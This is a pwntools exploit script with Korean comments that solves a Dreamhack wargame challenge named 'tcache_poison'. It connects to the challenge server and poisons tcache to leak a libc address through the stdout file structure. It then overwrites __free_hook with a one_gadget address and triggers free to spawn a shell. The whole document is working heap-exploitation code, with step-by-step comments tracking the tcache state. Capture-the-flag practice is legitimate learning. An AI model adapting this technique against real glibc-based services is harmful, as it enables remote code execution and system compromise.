from pwn import *

p = remote('host3.dreamhack.games', 24385)
elf = ELF('./tcache_poison')
libc = ELF('./libc-2.27.so')


def allocate(size, content):
    p.sendlineafter(b'Edit\n', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Content: ', content)  # 나중에 _IO_2_1_stdout__lsb를 보낼때 sendline으로 보내면 공백이 추가되서 안됨


def free():
    p.sendlineafter(b'Edit\n', b'2')


def print_chunk():
    p.sendlineafter(b'Edit\n', b'3')


def edit(content):
    p.sendlineafter(b'Edit\n', b'4')
    p.sendafter(b'Edit chunk: ', content)


# tcache[0x40] : empty
# chunk : first(1)
allocate(0x30, b'first')


# tcache[0x40] : first(1)
# chunk : first(1)
free()  # (1)


# tcache[0x40] : first(1) -> stdout -> _IO_2_1_stdout_
# chunk : first(1)
stdout = elf.symbols['stdout']
edit(p64(stdout) + b'a')


# tcache[0x40] : stdout -> _IO_2_1_stdout_
# chunk : first(1)
allocate(0x30, b'a')
# 어떤 값을 대입하면서 allocate하더라도 이미 tcache에는 stdout이 링크드 리스트의 헤더(청크의 헤더X)로 존재하므로 상관없음


# tcache[0x40] : _IO_2_1_stdout_
# chunk : stdout
_IO_2_1_stdout_lsb = p64(libc.symbols['_IO_2_1_stdout_'])[0:1]  # 첫번째 문자열 가져옴 : 문자열에서 첫번째는 lsb
allocate(0x30, _IO_2_1_stdout_lsb)
# 여기서 중요한게, 바로 아래에서 print_chunk를 할건데, stdout에 저장된(가리키는) _IO_2_1_stdout_을 변조하면 안됨
# 하지만 libc base를 몰라서 IO_stdout을 모르지만, 다행히 하위 3비트는 오프셋으로 고정되어 있어서 하위 1바이트인 lsb도 고정되있어서 lsb를 대입해주면 됨(리틀엔디언 잘 생각)


print_chunk()  # stdout에 저장된 IO_2_1_stdout_lsb 주소 출력
p.recvuntil(b'Content: ')  # print_chunk에서 'Content: '는 안받아줬기 때문에 여기까지 받아줘야 libc_base를 제대로 계산 가능

# Leak libc base
libc_base = u64(p.recvn(6).ljust(8, b'\x00')) - libc.symbols['_IO_2_1_stdout_']
free_hook = libc_base + libc.symbols['__free_hook']

# og = libc_base + 0x4f3ce
# og = libc_base + 0x4f3d5
og = libc_base + 0x4f432
# og = libc_base + 0x10a41c


# 여기서 tcache[0x40] 을 다시 쓰면 _IO_2_1_stdout_을 가져오는데 이 주소의 값을 바꾸면 안되므로 다른 tcache 엔트리를 써야함

# tcache[0x50] : empty
# chunk : first(1)
allocate(0x40, b'first')


# tcahce[0x50] : first(1)
# chunk : first(1)
free()


# tcache[0x50] : first(1) -> free_hook
# chunk : first(1)
edit(p64(free_hook))


# tcache[0x50] : free_hook
# chunk : first(1)
allocate(0x40, b'a')


# tcache[0x50] : empty
# chunk : free_hook
allocate(0x40, p64(og))  # free_hook이 저장된 주소에 og가 저장되어 free_hook -> og를 가리키게 됨


# Exploit
free()
p.interactive()
